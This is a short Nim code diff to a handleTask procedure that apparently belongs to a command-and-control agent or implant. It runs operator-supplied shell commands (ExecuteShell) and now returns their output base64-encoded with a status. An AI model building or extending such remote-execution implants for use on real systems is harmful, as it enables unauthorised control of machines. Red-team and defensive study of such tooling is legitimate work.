@@ -1,3 +1,4 @@
+import base64 
 import ./types 
 import ./commands/commands
 
@@ -7,16 +8,16 @@ proc handleTask*(task: Task): Task =
     case task.command: 
     of ExecuteShell: 
         
-        let cmdResult = taskShell(task.args)
-        echo cmdResult
+        let (output, status) = taskShell(task.args)
+        echo output
 
         return Task(
             id: task.id, 
             agent: task.agent,
             command: task.command,
             args: task.args,
-            result: cmdResult,
-            status: Completed
+            result: encode(output), # Base64 encode result
+            status: status
         )
 
     else: 
